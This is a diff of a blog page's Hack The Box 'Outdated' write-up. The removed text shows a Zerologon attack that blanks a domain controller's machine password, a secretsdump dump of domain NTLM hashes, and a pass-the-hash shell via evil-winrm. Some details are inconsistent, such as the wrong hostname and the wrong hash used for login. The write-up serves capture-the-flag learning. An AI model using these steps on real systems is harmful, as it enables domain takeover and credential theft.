@@ -11,17 +11,19 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <meta
   name="description"
-  content="Part of this article is encrypted with password:
-  --- DON&#39;T MODIFY THIS LINE --- You cannot see me unless you&amp;rsquo;ve got the password! #  Official box page on HTB #  System Scan | IP: 10.129.15.107 #  let&amp;rsquo;s add the ip to to the /etc/hosts file with the default hostnameoutdated.htb
- echo &#39;10.129.15.107 late.htb &#39; &amp;gt;&amp;gt; /etc/hosts nmap -Pn 10.129.15.107 -T4
- werz@ctf01:~/ctf/htb/outdated$ nmap -Pn 10."
+  content="&amp;gt; outdated.pdf #  The password for this is the Administrator password hash which looks like this:
+Administrator &amp;lt;&amp;lt;HIDDEN&amp;gt;&amp;gt; c::: "
 />
+
 <meta
   name="keywords"
   content="ctf, hackthebox, writeup, htb writeup, walkthrough, retired htb, hack the box, cybersecurtiy, capture the flag"
 />
 <meta name="robots" content="noodp" />
 <link rel="canonical" href="https://0xwerz.github.io/14/08/2022/outdated/" />
+<meta content="Posts about Cybersecurity, Pentesting, CTF writeups, and more" property="og:description" />
+<meta content="https://0xwerz.github.io/" property="og:url" />
+<meta content="Werz         Cybersecurity content, And more" property="og:title" />
 
 
 
@@ -32,11 +34,12 @@
 <link rel="stylesheet" href="https://0xwerz.github.io/style.css" />
 
 
-<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
-<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
-<link rel="manifest" href="/site.webmanifest">
-<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+<link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
+<link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png%20%7c%20absURL">
+<link rel="icon" type="image/png" sizes="32x32" href="img/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="img//android-chrome-192x192.png">
+<link rel="manifest" href="img/site.webmanifest">
+<link rel="mask-icon" href="img/safari-pinned-tab.svg" color="#5bbad5">
 <meta name="msapplication-TileColor" content="#da532c">
 <meta name="theme-color" content="#ffffff">
 
@@ -68,7 +71,7 @@
 
 
   </head>
-  <body class="light-theme">
+  <body class="dark-theme">
     <div class="container">
       <header class="header">
   <span class="header__inner">
@@ -180,7 +183,7 @@
 
       
         <span class="post-read-time"
-          >— 2 min read</span
+          >— 1 min read</span
         >
       
     </div>
@@ -203,123 +206,15 @@
 
     <div class="post-content">
       
-      
+      &gt; <h2 id="-outdatedpdfprotectedhtboutdatedpdf">
+  <a href="/protected/htb/outdated.pdf">outdated.pdf</a>
 
+  <a href="#-outdatedpdfprotectedhtboutdatedpdf" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<p>The password for this is the Administrator password hash which looks like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Administrator  &lt;&lt;HIDDEN&gt;&gt;  c:::
 
-
-<div class="hugo-encryptor-container">
-  <div class="hugo-encryptor-prompt">
-    
-      <p>Part of this article is encrypted with password:</p>
-    
-  </div>
-  <div class="hugo-encryptor-form">
-    <input
-      class="hugo-encryptor-input"
-      placeholder='Please input the password'
-    />
-    <input
-      class="hugo-encryptor-button"
-      type="button"
-      value='Click to verify'
-      onclick="_click_handler(this)"
-    />
-  </div>
-  <div
-    class="hugo-encryptor-cipher-text"
-    data-password="PASSWORD"
-    style="display: none;"
-  >
-    <span style="display: none;">--- DON'T MODIFY THIS LINE ---</span>
-    <h1 id="you-cannot-see-me-unless-youve-got-the-password">
-  You cannot see me unless you&rsquo;ve got the password!
-  <a href="#you-cannot-see-me-unless-youve-got-the-password" class="h-anchor" aria-hidden="true">#</a>
-</h1>
-Official <h3 id="official-box-pagehttpsapphacktheboxcommachinesoutdated-on-htb">
-  <a href="https://app.hackthebox.com/machines/outdated" target="_blank">box page</a>
- on HTB
-  <a href="#official-box-pagehttpsapphacktheboxcommachinesoutdated-on-htb" class="h-anchor" aria-hidden="true">#</a>
-</h3>
-<!-- raw HTML omitted -->
-<h4 id="system-scan--ip-1012915107">
-  System Scan | <strong>IP: 10.129.15.107</strong>
-  <a href="#system-scan--ip-1012915107" class="h-anchor" aria-hidden="true">#</a>
-</h4>
-<p>let&rsquo;s add the ip to to the <code>/etc/hosts</code> file with the default hostname<code>outdated.htb</code></p>
-<blockquote>
-<p><code>echo '10.129.15.107    late.htb ' &gt;&gt; /etc/hosts</code>
-nmap -Pn 10.129.15.107 -T4</p>
-</blockquote>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">werz@ctf01:~/ctf/htb/outdated$ nmap -Pn 10.129.15.107 -T4
-Nmap scan report <span style="color:#66d9ef">for</span> 10.129.15.107
-PORT      STATE   SERVICE
-25/tcp    open    smtp
-53/tcp    open    domain
-88/tcp    open    kerberos-sec
-135/tcp   open    msrpc
-139/tcp   open    netbios-ssn
-389/tcp   open    ldap
-445/tcp   open    microsoft-ds
-464/tcp   open    kpasswd5
-593/tcp   open    http-rpc-epmap
-636/tcp   open    ldapss1
-3268/tcp  open    globalcatLDAPssl
-5985/tcp  open    wsman
-50006/tcp open    unknown
-</code></pre></div><p>I Believe that the way I&rsquo;ll do is probably a unintended way.</p>
-<p>download <a href="https://github.com/risksense/zerologon" target="_blank">risksense/zerologon</a>
- and execute it passing it a DC name and the victim IP</p>
-<p>it will take some time:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">werz@ctf01:—/ctf/htb/outdated$ python3 set_empty_pw.py DC 10.129.15.107
-Performing authentication attempts... 
-<span style="color:#f92672">=======</span>
-
-NetrServerAuthenticate3Response
-ServerCredential:
-Data:                            b<span style="color:#e6db74">&#39;\xd7\x93\xa6\x1d\xe7\x1c\xbeut&#39;</span> 
-NegotiateFlags:                  <span style="color:#ae81ff">556793855</span> 
-AccountRid:                      <span style="color:#ae81ff">1002</span>
-ErrorCode:                       <span style="color:#ae81ff">0</span> 
-server challenge b<span style="color:#e6db74">&#39;\xd7\x9b$\x14\xbc\x91\xf7\x83&#39;</span> 
-Net rServerPasswordSet2Response 
-ReturnAuthenticator: 
-Credential: 
-Data:                           b<span style="color:#e6db74">&#39;\x014\x1d\x97\xb078;&#39;</span> 
-Timestamp:                      <span style="color:#ae81ff">0</span> 
-ErrorCode:                      <span style="color:#ae81ff">0</span> 
-
-Success! DC should now have the empty string as its machine password. 
-</code></pre></div><p>so the password has been removed we can dump hashes with impacket <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py" target="_blank">secretdump.py</a>
-</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">werz@ctf01:~/ctf/htb/outdated$ secretdump.py -just-dc -no-pass <span style="color:#e6db74">&#39;DC$@10.129.15.107&#39;</span>
-Impacket v0.10.0 - Copyright <span style="color:#ae81ff">2022</span> SecureAuth Corporation
-
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping Domain Credentials <span style="color:#f92672">(</span>domain<span style="color:#ae81ff">\u</span>id:rid:lmhash:nthash<span style="color:#f92672">)</span>
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:716f1ce2e2cf38ee1210cce35eb78cb6:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a300e4031093085c7af7ac61a79e6d00:::
-outdated.htb<span style="color:#ae81ff">\b</span>tables:1106:aad3b435b51404eeaad3b435b51404ee:781444163f086fdf8de13de9110ed6e7:::
-outdated.htb<span style="color:#ae81ff">\s</span>flowers:1108:aad3b435b51404eeaad3b435b51404ee:1fcdb1f6015dcb318cc77bb2bda14db5:::
-DC$:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-CLIENT$:1105:aad3b435b51404eeaad3b435b51404ee:c57f6ab8490903d04597f6ff606fc58b:::
-</code></pre></div><p>With the administrator hash we can connect with <a href="https://github.com/Hackplayers/evil-winrm" target="_blank">evil-winrm</a>
-</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">werz@ctf01:~/ctf/htb/outdated$ evil-winrm -u Administrator -i 10.129.15.107 -H 31d6cfe0d16ae931b73c59d7e0c089c0
-Evil-WinRm shell v2.3
-
-Info: Establishing connection to remote endpoint
-
-*Evil-WinRm* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>ocuments&gt;
-</code></pre></div><p>And we are in :)</p>
-<blockquote>
-<p>it may be patched anytime, I&rsquo;ll post the intented way soon.</p>
-</blockquote>
-
-  </div>
-</div>
-
-
+</code></pre></div>
     </div>
     
       
